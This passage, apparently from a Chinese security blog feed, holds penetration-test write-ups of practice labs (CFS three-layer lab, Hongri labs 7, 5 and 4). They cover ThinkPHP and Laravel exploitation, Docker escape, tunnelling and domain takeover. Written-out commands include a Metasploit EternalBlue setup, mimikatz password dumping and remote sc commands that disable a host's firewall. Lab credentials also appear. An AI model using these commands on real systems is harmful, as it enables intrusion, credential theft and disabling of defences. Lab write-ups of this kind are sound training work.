title="网络设备信息收集"></a>网络设备信息收集</h3><p>网络开放端口<br>路由<br>防火墙<br>代理服务器等相关设备的收集<br>Shodan</p><hr><h3 id="后台查找"><a href="#后台查找" class="headerlink" title="后台查找"></a>后台查找</h3><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">弱口令默认后台：<span class="hljs-keyword">admin</span>，<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">login</span>.asp，manage，asp等<br><br>查找网页等链接：一般来说，网站等主页有管理登陆类似的东西，有些<br><br>查找网站图片的属性<br><br>查找网站使用的管理系统，从而确定后台<br><br>用工具查找：wwwscan，intellitamper，御剑<br><br>txt的帮助：robots.txt文件告诉蜘蛛程序中服务器上什么样的文件<br><br>Googlehacker<br><br>查看网站使用的编辑器上否有默认后台<br><br>短文件利用<br><br>sqlmap –<span class="hljs-keyword">sql</span>-shel load_file(‘d:/wwwroot/<span class="hljs-keyword">index</span>.php’)<br><br>找关联性信息<br><br>同一个建站商<br><br>同一个注册邮箱<br><br>同一个注册人<br><br>后台可能不在同一个站<br></code></pre></div></td></tr></table></figure><hr><h3 id="端口后台"><a href="#端口后台" class="headerlink" title="端口后台"></a><strong>端口后台</strong></h3><p><strong>子域名</strong><br><strong>Admin.baidu.com</strong></p><p><strong>System.baidu.com</strong></p><p><em>可能是完全独立的另一个域名</em><br><em>如果是同一个服务器可以查旁站</em></p><hr><h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><p><em>判断CDN（超级ping）</em></p><p>绕过：</p><p>查找二级域名、让服务器主动给你发包（邮件）、敏感目录泄漏、查询历史解析ip、访问绕过CDN（修改hosts文件）</p>]]></content>
    
    
    <categories>
      
      <category>渗透基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CFS三层靶机</title>
    <link href="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/"/>
    <url>/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p>外网：centos7（宝塔）192.168.10.117（外）192.168.22.128（内）</p><p>二层：Ubuntu（二层）192.168.22.129（内IP1）192.168.33.128（内ip2）</p><p>三层：Windows7（三层）192.168.33.33（内ip3）</p><p>密码：teamssiy.com</p><p>外网开放端口 80 thinkphp</p><p>内网Ubuntu 需要配置宝塔，xdyhr37d:qwe123..</p><p>登录上去后，手动添加ip地址</p><h1 id="2、外网"><a href="#2、外网" class="headerlink" title="2、外网"></a>2、外网</h1><p>thinkPHP5.0，直接工具利用了</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110339041.png" alt="image-20240611110339041"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110343091.png" alt="image-20240611110343091"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110345943.png" alt="image-20240611110345943"></p><p>不是root权限，不管了，直接上线msf，开自动路由，然后上传fsan探测内网信息</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110348875.png" alt="image-20240611110348875"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110350970.png" alt="image-20240611110350970"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110353177.png" alt="image-20240611110353177"></p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611110357738.png" alt="image-20240611110357738"></p><p>129设备一个CMS站点，设置用client隧道直接代理出来</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111626767.png" alt="image-20240611111626767"></p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111642715.png" alt="image-20240611111642715"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111639439.png" alt="image-20240611111639439"></p><p>访问成功</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111631198.png" alt="image-20240611111631198"></p><p>前端源码有个hint，上sqlmap注入，</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111644787.png" alt="image-20240611111644787"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111647815.png" alt="image-20240611111647815"></p><p>robots找到后台，sqlmap找到后台账密</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111651637.png" alt="image-20240611111651637"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111654528.png" alt="image-20240611111654528"></p><p>然后设置白名单，上传shell，模板上传，然后路由过去</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111657922.png" alt="image-20240611111657922"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111703071.png" alt="image-20240611111703071"></p><p>蚁剑设置代理，连shell</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111705856.png" alt="image-20240611111705856"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111709213.png" alt="image-20240611111709213"></p><p>使用msf生成一个正向连接的马（bind），上传，运行，自动获取路由，然后获取到第三层网段，fscan上传上去探测一下。</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111711677.png" alt="image-20240611111711677"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111714613.png" alt="image-20240611111714613"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111717582.png" alt="image-20240611111717582"><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111720522.png" alt="image-20240611111720522"></p><p>存在永恒之蓝，用scanner探测一下，确定存在</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111723448.png" alt="image-20240611111723448"></p><p>然后使用psexec永恒之蓝，直接run，拿下三层</p><p><img src="/2024/06/11/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20240611111727218.png" alt="image-20240611111727218"></p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>三层靶机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（7）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A57/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A57/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234510066.png" alt="image-20240610234510066"></p><p><strong>域用户信息</strong></p><p>域用户账户和密码如下：</p><ul><li>Administrator：Whoami2021</li><li>whoami：Whoami2021</li><li>bunny：Bunny2021</li><li>moretz：Moretz2021</li></ul><p>Ubuntu 1：</p><ul><li>web：web2021</li></ul><p>Ubuntu 2：</p><ul><li>ubuntu：ubuntu</li></ul><p>通达OA账户：</p><ul><li>admin：admin65726</li></ul><h1 id="2、外网"><a href="#2、外网" class="headerlink" title="2、外网"></a>2、外网</h1><p>nmap开扫，版本，端口，在使用goby查看更详细内容，顺带扫一波漏洞</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234614013.png" alt="image-20240610234614013"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234622692.png" alt="image-20240610234622692"><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234624455.png" alt="image-20240610234624455"></p><p>存在一个laravelRCE漏洞，直接利用</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234627335.png" alt="image-20240610234627335"></p><p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234636408.png" alt="image-20240610234636408"></p><p><strong>这里使用哥斯拉连接，新版的哥斯拉无法连接，这里使用旧版哥斯拉</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234639063.png" alt="image-20240610234639063"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234642179.png" alt="image-20240610234642179"></p><p>上线msf</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234645616.png" alt="image-20240610234645616"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234649872.png" alt="image-20240610234649872"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234653034.png" alt="image-20240610234653034"></p><p>根据刚刚搭建的靶机，这里是52.10也就是Ubuntu2的docker环境，所以并没有什么用处，根据信息收集的内容</p><h2 id="Ubuntu1"><a href="#Ubuntu1" class="headerlink" title="Ubuntu1"></a><strong>Ubuntu1</strong></h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>自带的后门（这里参考其他文章）</strong></p><p>查找后门文件</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234659916.png" alt="image-20240610234659916"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234705241.png" alt="image-20240610234705241"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234708374.png" alt="image-20240610234708374"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234711325.png" alt="image-20240610234711325"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234735048.png" alt="image-20240610234735048"></p><h3 id="绕过docker"><a href="#绕过docker" class="headerlink" title="绕过docker"></a><strong>绕过docker</strong></h3><p>看到确实拿到了root权限，接下来就是docker逃逸了</p><p>这里是docker特权模式逃逸，讲解一下就是现在的docker内的root权限允许拥有外部物理机的root权限，而在之前docker内的root只拥有外部的普通用户权限，而现在docker的root用户可以访问主机上的所有设备文件</p><p>所以这里fdisk -l 查看磁盘文件 ls &#x2F;dev 查看设备文件</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234752880.png" alt="image-20240610234752880"></p><p>去挂载一个文件</p><p>在docker容器里挂载一个宿主的本地目录，这样某些容器里输出的文件，就可以在本地目录中打开访问了。</p><p>这里发现里面的sda1是可以挂载的</p><p>我们先来到根目录下 cd &#x2F;</p><p>然后创建一个目录 mkdir guazai</p><p>随便取一个名字然后挂载这个&#x2F;dev&#x2F;sda1</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234812822.png" alt="image-20240610234812822"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234818291.png" alt="image-20240610234818291"></p><p>挂载成功，这样就可以通过访问&#x2F;guazai这个目录达到访问物理机</p><p>接下来可以写ssh公私钥，也可以直接写计划任务来反弹shell</p><p>那这里我都带大家尝试一遍吧</p><p>1.写入ssh公私钥我们要用第一台机子去写入所以来到第一台的ssh中</p><p>写入然后将密钥复制出来，然后在docker机子上先覆盖密钥</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234846516.png" alt="image-20240610234846516"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234852475.png" alt="image-20240610234852475"></p><p>avx可以将权限也一同复制</p><p>将authorized_keys文件清空</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234906783.png" alt="image-20240610234906783"></p><p>清空后将刚刚生成的公私钥写入</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234916474.png" alt="image-20240610234916474"></p><p>粘贴进去就可以了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610234950115.png" alt="image-20240610234950115"></p><p>cat一下确实写进去了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235001095.png" alt="image-20240610235001095"></p><h2 id="Ubuntu2"><a href="#Ubuntu2" class="headerlink" title="Ubuntu2"></a>Ubuntu2</h2><p><strong>拿下Ubuntu2的机子，也就是存在docker的机子。</strong></p><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a><strong>第一种方法</strong></h3><p>信息搜集，发现存在redis未授权访问，getshell，绕过docker，写一个ssh连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235019449.png" alt="image-20240610235019449"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235024428.png" alt="image-20240610235024428"></p><p>然后使用redis写入进去</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235029247.png" alt="image-20240610235029247"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235041811.png" alt="image-20240610235041811"></p><p><strong>连接成功</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235045993.png" alt="image-20240610235045993"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235051963.png" alt="image-20240610235051963"></p><h3 id="第二种方法，绕过-docker"><a href="#第二种方法，绕过-docker" class="headerlink" title="第二种方法，绕过****docker"></a><strong>第二种方法，绕过****docker</strong></h3><figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">使用cve<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span><br><br>该漏洞（CVE<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span>）是2019年爆出的。在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。<br><br>利用该漏洞需要满足以下两个条件之一：<br><br>- •由一个攻击者控制的恶意镜像创建•攻击者具有某已存在容器的写权限，且可通过docker     exec进入。<br><br>首先下载攻击脚本： https://github.com/Frichetten/CVE<span class="hljs-string">-2019</span><span class="hljs-string">-5736</span>-PoC<br><br>打开main.go脚本，将脚本中要在目标机上执行的命令修改为反弹shell的命令，IP为攻击机IP，端口为攻击机监听的端口：<br></code></pre></div></td></tr></table></figure><h3 id="特权模式绕过"><a href="#特权模式绕过" class="headerlink" title="特权模式绕过"></a>特权模式绕过</h3><p>挂载过去</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235152702.png" alt="image-20240610235152702"></p><p>………</p><p>绕过去也就是Ubuntu2的机子</p><p>redis，拿到Ubuntu用户后，然后上传一个马，上线msf</p><p>传到81端口，wget下载，打开上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235212614.png" alt="image-20240610235212614"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235216941.png" alt="image-20240610235216941"></p><p>不是docker了</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235230923.png" alt="image-20240610235230923"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235236708.png" alt="image-20240610235236708"></p><h1 id="3、内网"><a href="#3、内网" class="headerlink" title="3、内网"></a>3、内网</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240610235843033.png" alt="image-20240610235843033"></p><p>这里10（Ubuntu1）和20（Ubuntu2）都已经拿下了，剩下一个30的，发现是通达OA</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000109643.png" alt="image-20240611000109643"></p><p>通达OA，直接利用前台的getshell洞，使用chisel搭建内网隧道，然后proxychains代理，火狐访问</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000122667.png" alt="image-20240611000122667"></p><p>利用此漏洞，这里代理出来，使用burp设置代理</p><p>然后开始复现漏洞</p><p><a href="https://blog.csdn.net/szgyunyun/article/details/107104288">https://blog.csdn.net/szgyunyun/article/details/107104288</a></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000208606.png" alt="image-20240611000208606"></p><p>构造危险代码图片文件</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000227184.png" alt="image-20240611000227184"></p><p>使用文件包含，命令执行成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000233035.png" alt="image-20240611000233035"></p><p>使用msf生成一个木马，这里需要使用正向链接payload，也就是不通过木马寻找msf，而是msf寻找木马，然后在10（Ubuntu1）那台上将马上传上去，然后使用Windows自带的certutil指令下载此文件，msf开始监听，运行上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000337717.png" alt="image-20240611000337717"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000342119.png" alt="image-20240611000342119"></p><p>也可以使用永恒之蓝拿下30</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhost 192.168.52.30<br><span class="hljs-built_in">set</span> RPORT 445<br><span class="hljs-built_in">set</span> lport 8526<br>setg Proxies socks5:127.0.0.1:9999<br>setg ReverseAllowProxy <span class="hljs-literal">true</span><br>run<br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000818403.png" alt="image-20240611000818403"></p><p>内网信息</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000832720.png" alt="image-20240611000832720"></p><p>上传fscan查看具体信息</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000843871.png" alt="image-20240611000843871"></p><p>这里有一个问题，就是使用load kiwi的时候执行这些命令报错的话，<strong>将其注入到其他进程中</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000848264.png" alt="image-20240611000848264"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611000939978.png" alt="image-20240611000939978"></p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">load kiwi<br>kiwi_cmd privilege::debug<br>kiwi_cmd sekurlsa::logonPasswords<br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001045161.png" alt="image-20240611001045161"></p><p>密码，包括域控制器的，域开启着防火墙，将其关闭</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001100498.png" alt="image-20240611001100498"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001121934.png" alt="image-20240611001121934"></p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> [\\192.168.93.30\ipc$](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30/ipc$) &quot;Whoami2021&quot; /user:&quot;Administrator&quot;</span><br><br><span class="hljs-keyword">sc</span> [\\192.168.93.30](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30) create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class="hljs-keyword">sc</span> [\\192.168.93.30](<span class="hljs-keyword">file</span>:<span class="hljs-comment">//192.168.93.30) start unablefirewall</span><br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001135466.png" alt="image-20240611001135466"></p><p>关闭防火墙成功</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001204246.png" alt="image-20240611001204246"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A57/image-20240611001226294.png" alt="image-20240611001226294"></p><p>永恒之蓝第二天就连不上了。。。。不清楚什么情况。。。。但是一般是在使用Windows7在93网段，然后使用以上方法关闭域的防火墙，然后使用永恒之蓝就可以拿下了，不过这里环境一直有问题。。。😭😭😭😭</p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（5）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A55/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A55/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233721335.png" alt="image-20240610233721335"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233726073.png" alt="image-20240610233726073"></p><h1 id="2、环境搭建"><a href="#2、环境搭建" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h1><p>端口+漏洞扫描，发现存在thinkPHP漏洞</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233750090.png" alt="image-20240610233750090"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233754007.png" alt="image-20240610233754007"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233758453.png" alt="image-20240610233758453"></p><p>直接使用利用工具，getshell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233804887.png" alt="image-20240610233804887"></p><p>蚁剑连接</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233830037.png" alt="image-20240610233830037"></p><p>上线msf</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233848273.png" alt="image-20240610233848273"></p><p>设置监听，成功上线</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233857407.png" alt="image-20240610233857407"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233916111.png" alt="image-20240610233916111"></p><p>成功内网ip，有个138.138网络</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233939119.png" alt="image-20240610233939119"></p><p>msf查看域用户</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610233957452.png" alt="image-20240610233957452"></p><h1 id="3、内网"><a href="#3、内网" class="headerlink" title="3、内网"></a>3、内网</h1><p>这里换一个用使用leo用户impersonate_toke切换</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234027496.png" alt="image-20240610234027496"></p><p>进入shell</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234044238.png" alt="image-20240610234044238"></p><p>开启自动路由</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234051645.png" alt="image-20240610234051645"></p><p>检测永恒之蓝，存在</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234057953.png" alt="image-20240610234057953"></p><p>获取leo的system权限，失败</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234104144.png" alt="image-20240610234104144"></p><p>这里先获取admin权限，在获取system权限，使用msf自带的模块</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234111370.png" alt="image-20240610234111370"></p><p>查看域用户，域账户dc.sun.com，ping，发现域控制器</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234117398.png" alt="image-20240610234117398"></p><p>关闭防火墙</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234206575.png" alt="image-20240610234206575"></p><p>打开隧道</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234213973.png" alt="image-20240610234213973"></p><p>Load_kiw</p><p>Creds_all</p><p>查看密文密码</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234227311.png" alt="image-20240610234227311"></p><p><strong>Psexec 攻击</strong></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234237264.png" alt="image-20240610234237264"></p><p>但是一直攻击失败，放弃使用psexec，上线cs看看</p><p>使用payload注入，监听reverse_http然后CS也同理，IP和端口一致</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234245869.png" alt="image-20240610234245869"></p><p>掏出wmiexec试试，成功了。。。。域拿下</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A55/image-20240610234255621.png" alt="image-20240610234255621"></p>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全 靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场（4）</title>
    <link href="/2024/06/10/%E7%BA%A2%E6%97%A54/"/>
    <url>/2024/06/10/%E7%BA%A2%E6%97%A54/</url>
    
    <content type="html"><![CDATA[<h1 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h1><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610125908734.png" alt="image-20240610125908734"></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">拿出一张网卡配183网段，然后仅主机模式<br>然后web机器做一些配置<br>先进入ubuntu启动web,开启3个环境<br><span class="hljs-built_in">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045<br><span class="hljs-built_in">sudo</span> docker-compose up -d<br><span class="hljs-built_in">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/<br><span class="hljs-built_in">sudo</span> docker-compose up -d<br><span class="hljs-built_in">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/<br><span class="hljs-built_in">sudo</span> docker-compose up -d<br></code></pre></div></td></tr></table></figure><h1 id="2、外网"><a href="#2、外网" class="headerlink" title="2、外网"></a>2、外网</h1><p>信息收集，外网开放4个端口，整理</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130012215.png" alt="image-20240610130012215"></p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-number">2001</span><span class="hljs-number">-2003</span><br><br><span class="hljs-number">2001</span><span class="hljs-string">：status</span><br><br><span class="hljs-number">2002</span><span class="hljs-string">：tomcat</span><br><br><span class="hljs-number">2003</span><span class="hljs-string">：phpmyadmin</span><br></code></pre></div></td></tr></table></figure><p>使用工具查看端口细节，2001端口struts2，直接漏洞利用</p><p>2002漏洞，tomacat，爆破</p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130034549.png" alt="image-20240610130034549"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130043600.png" alt="image-20240610130043600"></p><p><img src="/2024/06/10/%E7%BA%A2%E6%97%A54/image-20240610130046803.png" 